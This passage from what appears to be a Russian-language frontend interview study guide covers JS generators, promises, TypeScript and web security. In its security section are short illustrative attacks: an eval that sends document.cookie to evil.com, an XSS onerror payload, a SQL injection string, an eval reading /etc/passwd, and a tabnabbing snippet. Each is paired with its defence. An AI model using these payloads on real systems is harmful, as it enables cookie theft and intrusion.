const iterable = {
  [Symbol.iterator]() {
    let i = 0;
    return {
      next() {
        return i < 3
          ? { value: i++, done: false }
          : { value: undefined, done: true };
      }
    };
  }
};
\`\`\`

**Генератор** — автоматически реализует оба протокола одновременно.

Вызов генераторной функции возвращает объект-генератор. Этот объект:
• реализует **Iterator** — имеет метод \`next()\`
• реализует **Iterable** — имеет метод \`[Symbol.iterator]()\`, который возвращает \`this\`
\`\`\`js
function* gen() { yield 1; yield 2; }
const g = gen();

typeof g.next;                // 'function' → Iterator ✓
g[Symbol.iterator]() === g;   // true → Iterable ✓, возвращает сам себя
\`\`\`
Поскольку \`[Symbol.iterator]()\` возвращает \`this\`, генератор можно передавать везде где ожидается итерируемое — \`for...of\`, spread, \`Array.from()\` — и при этом состояние (позиция) не сбрасывается, итерация продолжается с того же места:
\`\`\`js
function* gen() { yield 1; yield 2; yield 3; }
const g = gen();

g.next();          // { value: 1, done: false } — вызов как Iterator
[...g];            // [2, 3] — spread использует Iterable, но g уже на позиции 2
\`\`\`
Для сравнения — обычный массив при каждом \`[Symbol.iterator]()\` создаёт новый итератор с начала. Генератор — нет, он один объект в обоих ролях.
\`\`\`js
function* gen() {
  const x = yield 'first';  // строка 1
  const y = yield 'second'; // строка 2
  return x + y;             // строка 3
}
const g = gen();
\`\`\`

**g.next()** — запуск (первый аргумент всегда игнорируется):
• Идёт до первого yield, возвращает \`{ value: 'first', done: false }\`
• Заморожен на строке 1

**g.next('world')** — продолжение:
• 'world' → результат yield 'first' → x = 'world'
• Идёт до следующего yield, возвращает \`{ value: 'second', done: false }\`

**g.next('!')** — продолжение:
• '!' → результат yield 'second' → y = '!'
• Идёт до return, возвращает \`{ value: 'world!', done: true }\`

**Правило:** то что передаёшь в next() — становится результатом предыдущего yield.

**yield* — делегирование:**
\`\`\`js
function* outer() {
  yield 0;
  yield* [1, 2, 3];  // массив
  yield* 'abc';       // строка
  yield* inner();     // другой генератор
}
[...outer()]; // [0, 1, 2, 3, 'a', 'b', 'c']
\`\`\`

**Что работает с итерируемыми:** for...of, [...spread], Array.from(), деструктуризация.
**Встроенные итерируемые:** Array, String, Map, Set, arguments, NodeList, генераторы.

**Практика:**
\`\`\`js
function* idGenerator() {
  let id = 1;
  while (true) yield id++;
}

function* range(start, end) {
  while (start <= end) yield start++;
}
for (const num of range(1, 5)) console.log(num); // 1 2 3 4 5
\`\`\`

**Применение:** Redux-Saga, бесконечные последовательности, ленивые вычисления. async/await под капотом — Babel компилирует в генераторы + промисы.`,score:2.5},{name:"Работа с запросами",level:"2",content:`**Промисы — цепочки:**
• .then() и .catch() всегда возвращают новый промис
• Ошибка пропускает все .then() до ближайшего .catch()
• .catch() без throw — «чинит» цепочку
• .finally() — всегда, не получает аргументов, пропускает значение дальше

**promise.then(ok, err) vs promise.then(ok).catch(err):**
В первом: err НЕ ловит ошибки из ok. Во втором: catch ловит всё.

**Promise combinators:**
\`\`\`js
// Все выполнятся — вернёт массив результатов. Один reject → всё reject.
const [user, posts] = await Promise.all([fetchUser(id), fetchPosts(id)]);

// Все выполнятся — вернёт массив { status, value/reason }. Никогда не reject.
const results = await Promise.allSettled([req1(), req2(), req3()]);
const ok = results.filter(r => r.status === 'fulfilled').map(r => r.value);

// Первый завершившийся (resolve ИЛИ reject) побеждает.
const data = await Promise.race([fetchFromPrimary(), fetchFromFallback()]);

// Первый resolve побеждает. Reject только если ВСЕ упали (AggregateError).
const fastest = await Promise.any([cdn1(), cdn2(), cdn3()]);
\`\`\`

**AbortController** — отмена fetch и любых async операций:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal })
  .catch(e => { if (e.name !== 'AbortError') throw e; });

controller.abort(); // отмена

// В React — отменяем при размонтировании (обязательный паттерн!)
useEffect(() => {
  const controller = new AbortController();
  fetch('/api', { signal: controller.signal }).then(setData);
  return () => controller.abort();
}, []);
\`\`\``}]},{id:"ts",title:"TS",icon:"🔷",color:"#3178C6",topics:[{name:"Основные типы данных в TS",level:"2",content:`**Примитивы:** string, number, boolean, null, undefined, bigint, symbol.

**TS-specific:**
• **any** — отключает проверку
• **unknown** — безопасный any, требует проверки типа
• **never** — функция никогда не завершится (throw, while(true))
• **void** — функция ничего не возвращает
• **tuple** — массив фиксированной длины: [string, number]
• **enum** — набор именованных констант`,score:3},{name:"Keyof, typeof",level:"2",content:"**keyof** — union ключей: keyof User → 'name' | 'age' (НЕ string!)\n**typeof** (в TS) — выводит тип из значения: typeof user → { name: string; age: number }\n\n**Комбинация:** keyof typeof obj → union ключей из значения.\n\n**as const + typeof — literal типы из объектов:**\n```ts\nconst config = {\n  url: '/api',\n  method: 'GET'\n} as const;\n\ntype Method = typeof config['method']; // 'GET' — literal тип, не string\n```\nБез `as const` — `method` был бы `string`. С `as const` — точный literal `'GET'`.\n`as const` замораживает все значения до самых узких типов и добавляет `readonly` на все уровни.",score:3.5},{name:"Interface vs types (extend, |, &)",level:"3",content:`**interface** — declaration merging (повторное объявление объединяется), extends.
**type** — расширение через &, union |, mapped types, conditional types.

**Union (|):** A или B (или оба).
**Intersection (&):** обязательно A и B.

type тоже можно implements в классах.`,score:3.5},{name:"Файлы деклараций .d.ts",level:"3",content:`**.d.ts** — файл только с типами, без реализации. TypeScript читает его чтобы знать что экспортирует модуль, но в JS-бандл он не попадает.

**Зачем нужны:**
JS-библиотека написана на JS — TypeScript не знает её типы. .d.ts даёт ему эту информацию. Можно типизировать любой JS-код не переписывая его.

**Три источника .d.ts:**

**1. Встроены в саму библиотеку** — авторы написали на TypeScript и скомпилировали:
\`\`\`json
// package.json библиотеки
{ "types": "./dist/index.d.ts" }
\`\`\`
TS находит это автоматически.

**2. @types/* пакеты** — отдельный пакет с декларациями для JS-библиотек:
\`\`\`bash
npm i -D @types/react @types/node
\`\`\`
PostedBy сообщество DefinitelyTyped. Устанавливаются как devDependency — в продакшн-бандл не попадают.

**3. Написаны вручную** — для своего JS-кода или внутренних модулей:
\`\`\`ts
// legacy.d.ts — типизируем старый JS-модуль
declare module './legacy/utils' {
  export function formatDate(date: Date): string;
  export function parseId(id: unknown): number;
}
\`\`\`

**declare — ключевое слово в .d.ts:**
Говорит TS "это существует в рантайме, доверяй мне":
\`\`\`ts
// Объявить переменную без значения:
declare const __DEV__: boolean;        // например, вшитая webpack-ом
declare function require(id: string): any;

// Объявить модуль (любой импорт этого пути → any):
declare module '*.svg' {
  const src: string;
  export default src;
}

// Объявить модуль с типами:
declare module 'my-lib' {
  export interface Options { timeout: number; }
  export function init(opts: Options): void;
}
\`\`\`

**declare global — расширение глобального namespace:**
\`\`\`ts
// Добавить свойство к window:
declare global {
  interface Window {
    analytics: Analytics;
    __APP_CONFIG__: AppConfig;
  }
}

// Или расширить существующий тип:
declare global {
  interface Array<T> {
    groupBy(key: keyof T): Record<string, T[]>;
  }
}
\`\`\`
Важно: declare global работает только внутри module-файла (с import/export). В глобальном файле — просто interface Window.

**Автогенерация .d.ts из своего кода:**
\`\`\`json
// tsconfig.json
{ "declaration": true, "declarationDir": "./dist/types" }
\`\`\`
При сборке библиотеки tsc генерирует .d.ts автоматически рядом с JS-файлами. Потребители получат типы без @types.

**Нюанс — ambient vs module declarations:**
Если .d.ts файл не содержит import/export — он ambient (глобальный), типы доступны везде без импорта. Если содержит import/export — это module, типы нужно импортировать явно.`,score:3},{name:"Механизм typeGuard, type cast",level:"3",content:"**Type Guard:** функция с type predicate:\n```ts\nfunction isCat(x: Cat | Dog): x is Cat { return 'meow' in x; }\n```\n\n**Type Cast:** `as` (основной) и `<Type>` (не работает в JSX).\nЭто утверждение, не преобразование — в рантайме ничего не происходит.",score:3.5},{name:"UtilityTypes",level:"3",content:`**Partial<T>** — все поля необязательны
**Required<T>** — все поля обязательны
**Readonly<T>** — все поля только для чтения
**Pick<T, K>** — выбирает поля K из T
**Omit<T, K>** — исключает поля K из T
**Record<K, V>** — объект с ключами K и значениями V
**Exclude<T, U>** — убирает из union T типы из U
**Extract<T, U>** — оставляет в union T только типы из U
**NonNullable<T>** — убирает null и undefined
**ReturnType<T>** — тип возврата функции
**Parameters<T>** — типы параметров функции как tuple
**InstanceType<T>** — тип экземпляра класса
**Awaited<T>** — разворачивает Promise
**ConstructorParameters<T>** — типы параметров конструктора`,score:4},{name:"Generics",level:"3",content:"Переиспользуемый код с разными типами:\n```ts\nfunction first<T>(arr: T[]): T { return arr[0]; }\n```\n\n**Ограничения (extends):**\n```ts\nfunction getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {\n  return obj[key]; // TypeScript знает тип возврата\n}\n```\n\n**Дефолтные типы:**\n```ts\ninterface State<T = string> { value: T; }\ntype State1 = State;         // State<string>\ntype State2 = State<number>; // State<number>\n```\n\n**Conditional generics (зависимый возврат):**\n```ts\ntype Flatten<T> = T extends Array<infer Item> ? Item : T;\ntype A = Flatten<string[]>; // string\ntype B = Flatten<number>;   // number\n```\n\n**Variance (вариантность):**\n- **Covariant (ковариантный):** `Dog extends Animal` → `() => Dog` совместим с `() => Animal` (return types — ковариантны)\n- **Contravariant (контравариантный):** `(Animal) => void` → несовместим с `(Dog) => void` (параметры — контравариантны со `strictFunctionTypes`)\n```ts\ntype Logger<T> = (value: T) => void;\n// Если нужен Logger<Animal>, можно передать Logger<Animal>\n// но НЕ Logger<Dog> — т.к. Logger<Animal> ожидает любой Animal\n```",score:4},{name:"Template Literal Types",level:"3",content:`Строковые шаблоны в типах:
\`\`\`ts
type Event = 'click' | 'hover';
type Handler = \\\`on\${Capitalize<Event>}\\\`; // 'onClick' | 'onHover'
\`\`\`

Автоматическая генерация всех комбинаций из union. 
      **Capitalize<T>** — первая буква заглавная: 'hello' → 'Hello'
**Uncapitalize<T>** — первая буква строчная: 'Hello' → 'hello'
**Uppercase<T>** — всё заглавными: 'hello' → 'HELLO'
**Lowercase<T>** — всё строчными: 'HELLO' → 'hello'`,score:3.5},{name:"Conditional types, mapped types, infer",level:"4",content:`**Conditional:** T extends string ? 'yes' : 'no'
**Mapped:** [K in keyof T]?: T[K] — перебор ключей с трансформацией.
**infer:** вытаскивает тип из структуры:
\`\`\`ts
type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
\`\`\`

**Distributive (разворачивается по union):**
\`\`\`ts
type ToArray<T> = T extends any ? T[] : never;
type A = ToArray<string | number>; // string[] | number[]

// Чтобы ОТКЛЮЧИТЬ distributive — обернуть в кортеж:
type ToArrayStrict<T> = [T] extends [any] ? T[] : never;
type B = ToArrayStrict<string | number>; // (string | number)[]
\`\`\`

**Mapped type modifiers (+/-):**
\`\`\`ts
type Mutable<T> = { -readonly [K in keyof T]: T[K] };   // убрать readonly
type Optional<T> = { [K in keyof T]+?: T[K] };           // добавить ?
type Required<T> = { [K in keyof T]-?: T[K] };           // убрать ?
\`\`\`

**Key Remapping (\`as\`) — переименование ключей в mapped type:**
\`\`\`ts
type NewType<T> = {
  [K in keyof T as НовыйКлюч]: T[K]
}
\`\`\`
После \`as\` можно использовать template literal types для построения нового имени:
\`\`\`ts
// Добавить префикс get к каждому ключу:
type Getters<T> = { [K in keyof T as \`get\${Capitalize<string & K>}\`]: () => T[K] };
type User = { name: string; age: number };
type UserGetters = Getters<User>; // { getName: () => string; getAge: () => number }
\`\`\`
Или conditional type для фильтрации ключей — \`never\` исключает ключ:
\`\`\`ts
// Оставить только строковые ключи:
type StringKeys<T> = { [K in keyof T as T[K] extends string ? K : never]: T[K] };
type User = { name: string; age: number; email: string };
type StringOnly = StringKeys<User>; // { name: string; email: string }
\`\`\`

**infer для сложных структур:**
\`\`\`ts
type Unpacked<T> = T extends Promise<infer U> ? U : T;
type Head<T extends any[]> = T extends [infer H, ...any[]] ? H : never;
type Tail<T extends any[]> = T extends [any, ...infer R] ? R : never;

type H = Head<[string, number, boolean]>; // string
type T = Tail<[string, number, boolean]>; // [number, boolean]
\`\`\``,score:3},{name:"Перегрузка функций",level:"4",content:`**Зачем нужна перегрузка:**
Иногда функция ведёт себя по-разному в зависимости от типа аргументов — и возвращаемый тип тоже разный. Без перегрузки TypeScript вывел бы слишком широкий тип и потерял информацию:
\`\`\`ts
// Без перегрузки — TS не знает что именно вернётся:
function wrap(value: string | number): string | number[] { ... }
const result = wrap('hello'); // тип: string | number[] — неточно

// С перегрузкой — TS знает точно:
function wrap(value: string): string;
function wrap(value: number): number[];
function wrap(value: string | number): string | number[] {
  return typeof value === 'string' ? value.toUpperCase() : [value];
}
const a = wrap('hello'); // тип: string ✅
const b = wrap(42);     // тип: number[] ✅
\`\`\`

**Структура:**
\`\`\`ts
// 1. Сигнатуры перегрузок — только для TypeScript, в JS не существуют:
function format(value: string): string;
function format(value: number, decimals: number): string;

// 2. Сигнатура реализации — невидима снаружи, покрывает все варианты:
function format(value: string | number, decimals?: number): string {
  if (typeof value === 'string') return value.trim();
  return value.toFixed(decimals ?? 2);
}

// Вызвать можно только через сигнатуры перегрузок:
format('hello');    // ✅
format(3.14, 1);    // ✅
format(3.14);       // ❌ — не совпадает ни с одной сигнатурой
\`\`\`

**Порядок сигнатур важен — конкретные выше:**
\`\`\`ts
// ✅ Правильно: более конкретный тип выше
function parse(input: 'json'): object;
function parse(input: string): unknown;
function parse(input: string): object | unknown { ... }

// ❌ Неправильно: string поглощает 'json' раньше
function parse(input: string): unknown;
function parse(input: 'json'): object; // никогда не будет выбрана
\`\`\`

**Перегрузка методов класса:**
\`\`\`ts
class EventEmitter {
  on(event: 'data', handler: (data: Buffer) => void): this;
  on(event: 'error', handler: (err: Error) => void): this;
  on(event: string, handler: (...args: any[]) => void): this {
    // реализация
    return this;
  }
}
\`\`\`

**Когда использовать перегрузку, а когда union:**
\`\`\`ts
// Union достаточно — возвращаемый тип не зависит от входного:
function log(value: string | number): void { ... }

// Перегрузка нужна — возвращаемый тип зависит от входного:
function clone(value: string): string;
function clone(value: number): number;
function clone<T>(value: T): T { return value; }
\`\`\`

**Перегрузка vs generic + conditional — в чём разница:**
\`\`\`ts
// Вариант 1 — перегрузка:
function unwrap(value: string[]): string;
function unwrap(value: number[]): number;
function unwrap(value: any[]): any { return value[0]; }

const a = unwrap(['a', 'b']); // string
const b = unwrap([1, 2]);      // number

// Вариант 2 — generic + conditional:
function unwrap2<T extends any[]>(value: T): T extends (infer U)[] ? U : never {
  return value[0];
}

const c = unwrap2(['a', 'b']); // string
const d = unwrap2([1, 2]);      // number
\`\`\`
\`\`\`
Перегрузка:
+ Явный список сигнатур — что не описано, то нельзя вызвать
+ Хорошо читается в IDE (видишь все варианты вызова)
- Внутри реализации типы — any/union, нужно if-ить руками
- Не масштабируется на бесконечное число случаев

Generic + conditional:
+ Универсальное правило вывода для любого типа
+ Внутри реализации тип сохраняется (типобезопаснее)
- Сложнее читается
- Ошибки при неподходящем входе менее очевидные
\`\`\`
**Когда что выбирать:**
• 2–5 конкретных случаев с разной семантикой → перегрузка
• Общее правило для любого типа ("распакуй массив", "достань возвращаемый тип") → generic + conditional`,score:3},{name:"Reference types",level:"4",content:`Reference types — директивы в начале файла для подключения типов:

**Triple-slash directives:**
\`\`\`ts
/// <reference types="node" />          // подключает @types/node
/// <reference path="./other.d.ts" />   // подключает конкретный файл
/// <reference lib="dom" />             // подключает встроенную библиотеку TS
\`\`\`

В tsconfig.json можно указать \`types\` или \`lib\` глобально для всего проекта.

**Reference директивы нужны когда:**
• Нужен тип только в одном файле — не хочешь подключать глобально
• Автоматически генерируемые .d.ts — компилятор сам добавляет reference чтобы указать зависимости
• Старые проекты — до того как tsconfig стал стандартом

Сейчас в большинстве проектов reference директивы не нужны — всё настраивается через tsconfig.json.`,score:3.5},{name:"Использование tsc",level:"4",content:`**tsc** — компилятор TypeScript. Проверяет типы + компилирует в JS.

**tsconfig.json ключевые настройки:**
• **strict: true** — зонтичный флаг (strictNullChecks, noImplicitAny, и др.)
• **target** — версия JS на выходе (ES5, ES6, ESNext)
• **module** — система модулей (commonjs, esnext)
• **paths** — алиасы импортов
• **include/exclude** — какие файлы компилировать

**strict: true включает:**
• **noImplicitAny** — нельзя неявный any
• **strictNullChecks** — null и undefined не совместимы с другими типами
• **strictFunctionTypes** — строгая проверка типов функций при присваивании
• **strictPropertyInitialization** — все поля класса должны быть инициализированы в конструкторе

**--noEmit** — проверяет типы но не генерирует JS файлы. Используется:
• В CI/CD для проверки типов без сборки
• Когда сборкой занимается другой инструмент (Vite, webpack) а TS только для типов
\`\`\`bash
tsc --noEmit         # только проверка типов
tsc --watch          # следит за изменениями
tsc --noEmit --watch # проверка типов в режиме слежения
\`\`\`

**Ключевые флаги:**
• **--noEmit** — проверка типов без генерации файлов (для CI, когда сборкой занимается Vite/webpack)
• **--declaration** — генерирует .d.ts рядом с JS (нужно при публикации библиотеки)
• **--sourceMap** — генерирует .map файлы: в браузере дебаггер показывает TS-строки вместо скомпилированного JS
• **--incremental** — кеширует результаты предыдущей компиляции в .tsbuildinfo, повторная сборка только изменённых файлов

**paths + baseUrl — алиасы импортов:**
\`\`\`json
// tsconfig.json
{
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "@utils/*": ["src/utils/*"],
      "@components/*": ["src/components/*"]
    }
  }
}
\`\`\`
\`\`\`ts
// Вместо:
import { formatDate } from '../../../utils/date';
// Можно:
import { formatDate } from '@utils/date';
\`\`\`
Важно: paths — это только TypeScript. Бандлер (Vite, webpack) про них не знает — нужно дублировать алиасы в его конфиге (resolve.alias в Vite, alias в webpack).

**.tsbuildinfo — инкрементальная сборка:**
\`\`\`json
// tsconfig.json
{ "incremental": true, "tsBuildInfoFile": "./.tsbuildinfo" }
\`\`\`
tsc при первой компиляции создаёт .tsbuildinfo — snapshot графа зависимостей и хешей файлов. При следующем запуске перекомпилирует только изменившиеся файлы и их зависимости. На больших проектах ускоряет повторную сборку в 3–10 раз.

.tsbuildinfo добавляют в .gitignore — он локальный, зависит от путей машины. В CI сборка с нуля если кеш не восстановлен.`,score:3.5}]},{id:"security",title:"БЕЗОПАСНОСТЬ",icon:"🔒",color:"#EF5350",topics:[{name:"eval, dangerouslySetInnerHTML",level:"2",content:`**eval() — выполняет строку как JS-код в рантайме:**
\`\`\`js
eval('alert(1)');              // выполнит alert
eval('fetch("evil.com?" + document.cookie)'); // украдёт куки
\`\`\`

**Почему опасно:**
Если в строку попадают пользовательские данные — атакующий может выполнить любой код с привилегиями текущей страницы: украсть cookies/localStorage, делать запросы от имени пользователя, менять DOM.

**Почему медленно:**
V8 не может оптимизировать код внутри eval — Hidden Classes, Inline Caching, JIT не работают. Плюс eval читает и модифицирует текущий scope — это блокирует ряд оптимизаций всей окружающей функции.

**Альтернативы:**
\`\`\`js
// Вместо eval для вычисления выражений:
new Function('x', 'return x * 2')(5); // изолирован от текущего scope

// Вместо eval для динамических ключей:
const key = 'name';
obj[key]; // просто доступ через переменную

// Вместо eval для JSON:
JSON.parse(str); // безопасно, только данные — не код
\`\`\`
\`new Function()\` тоже небезопасен для пользовательского ввода — изолирует от scope, но всё равно выполняет произвольный код.

---

**dangerouslySetInnerHTML — React-аналог innerHTML:**
\`\`\`jsx
// ❌ Опасно — если html пришёл от пользователя:
<div dangerouslySetInnerHTML={{ __html: userContent }} />
// Если userContent = '<img src=x onerror=alert(1)>' — XSS
\`\`\`

**Санитизация (sanitize)** — это очистка HTML от опасных тегов и атрибутов перед вставкой в DOM. Санитайзер парсит HTML и удаляет: теги \`<script>\`, обработчики событий (\`onerror\`, \`onclick\`, \`onload\`), \`javascript:\` в href/src, и другие векторы XSS.

**DOMPurify — стандартная библиотека для санитизации:**
\`\`\`js
import DOMPurify from 'dompurify';

// Базовое использование:
const clean = DOMPurify.sanitize(dirtyHtml);
// '<script>alert(1)<\/script><b>text</b>' → '<b>text</b>'
// '<img src=x onerror=alert(1)>' → '<img src=x>'

// Разрешить только определённые теги:
const clean = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
});
\`\`\`

\`\`\`jsx
// ✅ Правильно — всегда санитизировать перед вставкой:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
\`\`\`

**Когда dangerouslySetInnerHTML вообще нужен:**
• Вывод rich-text из CMS (контент редактора — Quill, TipTap)
• Email-превью в браузере
• Статьи с форматированием из базы

Во всех случаях — только с санитизацией. React специально назвал пропс "dangerously" чтобы разработчик думал дважды.`,score:3.5},{name:"Аутентификация и авторизация, их отличия",level:"2",content:`**Аутентификация (Authentication)** — КТО ты? Проверка личности. Логин/пароль, OAuth, биометрия, токен.

**Авторизация (Authorization)** — ЧТО тебе можно? Проверка прав после того как личность установлена. Роли, permissions, scopes.

Сначала всегда аутентификация — потом авторизация. Без установленной личности незачем проверять права.

---

**Session-based аутентификация:**
\`\`\`
1. Пользователь вводит логин/пароль
2. Сервер проверяет, создаёт сессию в БД/Redis: { sessionId: 'abc', userId: 42, exp: ... }
3. Клиент получает httpOnly cookie с sessionId
4. При каждом запросе браузер автоматически шлёт cookie
5. Сервер смотрит sessionId → находит сессию → знает кто это
\`\`\`
Инвалидация мгновенная — удалил запись в Redis, сессия мертва. Минус: нужен общий Redis при горизонтальном масштабировании.

**JWT-аутентификация:**
\`\`\`
1. Пользователь логинится
2. Сервер создаёт JWT: header.payload.signature
3. Клиент хранит токен и шлёт в заголовке: Authorization: Bearer <token>
4. Сервер проверяет подпись — никакой БД не нужно (stateless)
\`\`\`
\`\`\`js
// Payload JWT (читаем кем угодно — не шифруется!):
{ userId: 42, role: 'admin', exp: 1716000000 }
\`\`\`
Плюс: stateless, легко масштабируется. Минус: нельзя мгновенно инвалидировать — токен живёт до истечения exp.

**Где хранить токены:**

**localStorage** — доступен из JS → украдут через XSS. Нельзя для access/refresh токенов.

**httpOnly cookie** — JS не может прочитать, браузер шлёт автоматически. Уязвим к CSRF, но защищается SameSite=Strict/Lax.

**In-memory (переменная в JS)** — самый безопасный для access token. Но теряется при перезагрузке страницы.

**Token rotation паттерн (лучшая практика):**
\`\`\`
access token  → 15 мин, хранить in-memory
refresh token → 7 дней, хранить в httpOnly cookie
\`\`\`
\`\`\`js
// access истёк → отправляем refresh token:
POST /auth/refresh
Cookie: refresh_token=xyz  // браузер шлёт автоматически

// Сервер:
// 1. Проверяет refresh token (хэш в БД)
// 2. Выдаёт новый access token
// 3. Ротирует refresh token (старый инвалидируется)
Response: { accessToken: 'new_jwt' }
\`\`\`
Ротация refresh при каждом обновлении — если украли refresh, его использование сразу видно (старый уже невалиден).

---

**OAuth 2.0** — протокол делегированной авторизации. Позволяет дать приложению доступ к ресурсам пользователя без передачи пароля.

**Authorization Code + PKCE** — стандартный flow для SPA и мобильных:
\`\`\`
1. Редирект на OAuth-провайдер (Google, GitHub)
2. Пользователь логинится у провайдера → соглашается дать доступ
3. Провайдер редиректит обратно с code
4. Клиент меняет code на access token (+ PKCE проверка)
5. Используем access token для API
\`\`\`
PKCE (Proof Key for Code Exchange) — защита от перехвата code: клиент генерирует случайный code_verifier, шлёт его хэш при старте, и сам verifier при обмене.

**Client Credentials** — server-to-server, без пользователя:
\`\`\`
POST /oauth/token
{ client_id, client_secret, grant_type: 'client_credentials' }
→ access token
\`\`\`
Микросервисы, фоновые задачи, cron-джобы.

**Implicit flow** — устарел, небезопасен. Токен приходил прямо в URL — виден в логах, истории браузера. Заменён на Authorization Code + PKCE.`,score:4},{name:"npm audit. SCA и SAST",level:"2",content:`**Почему зависимости — зона риска:**
Типичное React-приложение тянет 500-1000 пакетов транзитивно. Уязвимость в любом из них — потенциальный вектор атаки. Атаки на supply chain (цепочку поставок) — один из главных векторов последних лет: атакуют не твой код, а пакет который ты используешь.

**npm audit:**
Сравнивает дерево зависимостей с базой CVE (Common Vulnerabilities and Exposures). Показывает уязвимость, severity (low/moderate/high/critical), и через какой пакет она попадает.
\`\`\`bash
npm audit                  # показать все уязвимости
npm audit --audit-level=high  # выйти с ошибкой только при high/critical
npm audit fix              # обновить уязвимые пакеты (только semver-совместимые)
npm audit fix --force      # обновить даже с breaking changes — опасно
\`\`\`
\`npm audit fix --force\` может сломать приложение — пакет обновится до мажорной версии с другим API. Делать только осознанно с последующим тестированием.

**SCA (Software Composition Analysis)** — автоматизированный анализ зависимостей на уязвимости и лицензионные проблемы:
• **npm audit** — встроен в npm, базовый уровень
• **Snyk** — глубже чем npm audit, находит уязвимости которые audit пропускает, интегрируется в CI
• **Dependabot (GitHub)** — автоматически создаёт PR для обновления уязвимых пакетов

SCA отвечает на вопрос: *есть ли известные уязвимости в том что я использую?*

**SAST (Static Application Security Testing)** — анализ твоего собственного кода без его запуска. Ищет потенциально опасные паттерны:
• **ESLint + eslint-plugin-security** — находит eval(), небезопасные регулярки, объекты без hasOwnProperty
• **SonarQube / SonarCloud** — глубокий анализ: SQL injection, XSS, hardcoded secrets
• **Semgrep** — кастомные правила под свой стек

SAST отвечает на вопрос: *есть ли уязвимый код в том что я написал?*

SCA + SAST вместе — разные слои защиты: один смотрит на чужой код, другой на твой.

---

**Что именно ищет SAST — типичные паттерны:**

**SQL-инъекция — конкатенация пользовательского ввода в запрос:**
\`\`\`sql
-- Запрос на сервере:
SELECT * FROM users WHERE name = '$input'

-- Пользователь вводит: ' OR '1'='1
-- Итоговый запрос:
SELECT * FROM users WHERE name = '' OR '1'='1'
-- Возвращает ВСЕХ пользователей
\`\`\`
Защита — параметризованные запросы (prepared statements). Значение передаётся отдельно от SQL-кода — база данных их никогда не смешивает:
\`\`\`js
// ❌ Конкатенация — уязвимо:
db.query(\`SELECT * FROM users WHERE name = '\${input}'\`);

// ✅ Параметризованный запрос — безопасно:
db.query('SELECT * FROM users WHERE name = ?', [input]);
// или с именованными параметрами (Postgres):
db.query('SELECT * FROM users WHERE name = $1', [input]);
\`\`\`

**Небезопасный eval с пользовательским вводом:**
\`\`\`js
// Пользователь передаёт строку:
const input = "require('fs').readFileSync('/etc/passwd')";
eval(input); // выполнит — прочитает системные файлы
\`\`\`
SAST видит \`eval(\` + переменная = потенциальная уязвимость. Никогда не передавать пользовательский ввод в eval.

**Захардкоженные секреты:**
\`\`\`js
// ❌ Плохо — секреты в коде:
const API_KEY = 'sk-1234567890abcdef'; // попадёт в git историю
const DB_PASSWORD = 'super_secret';

// ✅ Хорошо — через переменные окружения:
const API_KEY = process.env.API_KEY;
const DB_PASSWORD = process.env.DB_PASSWORD;
\`\`\`
SAST ищет паттерны \`password =\`, \`api_key =\`, \`secret =\`, токены в виде строк. Инструменты: truffleHog, git-secrets, GitHub secret scanning (встроен, сканирует автоматически при пуше).

**Если секрет уже попал в git — удаление из кода не помогает.** Git история хранит всё. Нужно: немедленно инвалидировать секрет (отозвать ключ/пересоздать пароль), и опционально почистить историю через \`git filter-repo\`.`,score:3},{name:"Атрибут rel: noreferrer, noopener, nofollow",level:"3",content:'**Проблема без этих атрибутов:**\nПри открытии ссылки в новой вкладке (`target="_blank"`) новая страница получает доступ к `window.opener` — ссылке на вкладку которая её открыла. Атакующий может написать:\n```js\n// На evil.com, куда вела ссылка с вашего сайта:\nwindow.opener.location = \'https://fake-login.com\';\n// Пользователь смотрит на новую вкладку, а оригинальный сайт\n// незаметно заменился на фишинговую копию — это tabnabbing\n```\n\n**noopener** — блокирует доступ к `window.opener`. Новая вкладка открывается в отдельном процессе без связи с оригинальной:\n```html\n<a href="https://external.com" target="_blank" rel="noopener">\n```\n\n**noreferrer** — делает то же что noopener, плюс не передаёт заголовок `Referer`. Referer — это URL страницы, с которой пришёл пользователь. Без него внешний сайт не узнает откуда пришёл переход:\n```\n// Без noreferrer внешний сайт видит:\nReferer: https://yoursite.com/secret-page\n\n// С noreferrer — заголовок отсутствует\n```\nНорма: всегда писать `rel="noopener noreferrer"` вместе для target="_blank".\n\n**nofollow** — не про безопасность, а про SEO. Указание поисковым роботам не передавать «ссылочный вес» (PageRank) на эту страницу:\n```html\n<!-- Пользовательский контент, платные ссылки, недоверенные источники: -->\n<a href="https://sponsor.com" rel="nofollow">Реклама</a>\n```\nГугл требует nofollow для платных/рекламных ссылок — иначе это манипуляция поисковой выдачей.',score:3},{name:"CSP и X-Frame-Options",level:"3",content:`**CSP (Content Security Policy)** — HTTP-заголовок, который говорит браузеру откуда разрешено загружать ресурсы. Второй рубеж защиты от XSS: даже если атакующий внедрил скрипт — браузер его не выполнит, если домен не в белом списке. Первый рубеж — экранирование на сервере, CSP — страховка при его пробое.

**Директивы** — каждая отвечает за свой тип ресурса. \`default-src\` — фолбэк для всех директив которые не заданы явно:
\`\`\`
Content-Security-Policy:
  default-src 'self';                   // только свой домен — фолбэк для остальных
  script-src 'self' cdn.example.com;   // откуда грузить JS
  style-src  'self' 'unsafe-inline';   // откуда грузить CSS
  img-src    'self' data: https:;      // картинки — свой + data URI + любой HTTPS
  connect-src 'self' api.example.com;  // fetch / XHR / WebSocket
  font-src   'self' fonts.gstatic.com; // шрифты
  frame-src  'none';                   // запрет загружать iframe на странице
  frame-ancestors 'none';              // запрет встраивать эту страницу в чужой iframe
  object-src 'none';                   // запрет Flash и плагинов
  upgrade-insecure-requests;           // автоматом заменяет http:// на https://
\`\`\`

**Ключевые значения:**
\`\`\`
'self'          — только текущий домен (без поддоменов)
'none'          — запрещено полностью
'unsafe-inline' — разрешить inline-стили/скрипты (ослабляет защиту)
'unsafe-eval'   — разрешить eval(), Function() (крайне нежелательно)
https:          — любой HTTPS домен
data:           — data: URI
\`\`\`

**Inline-скрипты запрещены по умолчанию** — это главная защита от XSS. Если атакующий внедрил \`<script>alert(1)<\/script>\` — браузер его заблокирует, потому что скрипт inline, а не с разрешённого домена.

\`'unsafe-inline'\` разрешает все inline-скрипты — сразу снимает эту защиту, использовать не стоит.

Правильное решение когда нужны inline-скрипты — **nonce**:
\`\`\`
